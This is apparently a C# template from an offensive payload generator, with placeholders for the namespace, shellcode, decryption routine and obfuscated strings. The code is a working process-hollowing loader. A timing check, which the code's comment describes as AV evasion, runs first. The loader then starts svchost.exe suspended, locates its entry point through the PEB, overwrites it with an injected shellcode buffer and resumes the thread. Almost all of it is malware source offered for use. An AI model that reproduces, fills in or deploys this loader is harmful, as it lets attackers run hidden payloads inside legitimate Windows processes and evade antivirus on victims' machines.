using System;
using System.Runtime.InteropServices;
using System.Text;

namespace #NS#
{
    public class #CLASS#
    {
        private const uint #CREATE_SUSPENDED# = 0x4;
        private const int #PBI# = 0;

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct #PI#
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public Int32 ProcessId;
            public Int32 ThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct #SI#
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct #PBI_STRUCT#
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
            [In] ref #SI# lpStartupInfo, out #PI# lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass,
            ref #PBI_STRUCT# procInformation, uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer,
            int dwSize, out IntPtr lpNumberOfbytesRW);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        public static void Main(string[] args)
        {
            // Simple AV evasion: Sleep and check
            DateTime t1 = DateTime.Now;
            Sleep(5000);
            double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
            if (deltaT < 4.5) return;

            #SHELLCODE#
            
            #DECRYPTION#

            // Start process in suspended state
            #SI# s = new #SI#();
            #PI# p = new #PI#();
            
            // "c:\\windows\\system32\\svchost.exe" obfuscated
            string t = #STRING_DECODER#;
            
            bool r = CreateProcess(null, t, IntPtr.Zero, IntPtr.Zero,
                false, #CREATE_SUSPENDED#, IntPtr.Zero, null, ref s, out p);

            if (!r) return;

            #PBI_STRUCT# pbi = new #PBI_STRUCT#();
            uint rl = new uint();
            ZwQueryInformationProcess(p.hProcess, #PBI#, ref pbi, (uint)(IntPtr.Size * 6), ref rl);
            IntPtr b = (IntPtr)((Int64)pbi.PebAddress + 0x10);

            byte[] pa = new byte[0x8];
            byte[] db = new byte[0x200];
            IntPtr brw = new IntPtr();
            ReadProcessMemory(p.hProcess, b, pa, pa.Length, out brw);
            IntPtr ex = (IntPtr)BitConverter.ToInt64(pa, 0);
            ReadProcessMemory(p.hProcess, ex, db, db.Length, out brw);

            uint el = BitConverter.ToUInt32(db, 0x3c);
            uint ro = el + 0x28;
            uint rva = BitConverter.ToUInt32(db, (int)ro);
            IntPtr ep = (IntPtr)((Int64)ex + rva);

            WriteProcessMemory(p.hProcess, ep, #BUF#, #BUF#.Length, out brw);
            ResumeThread(p.hThread);
        }
    }
}
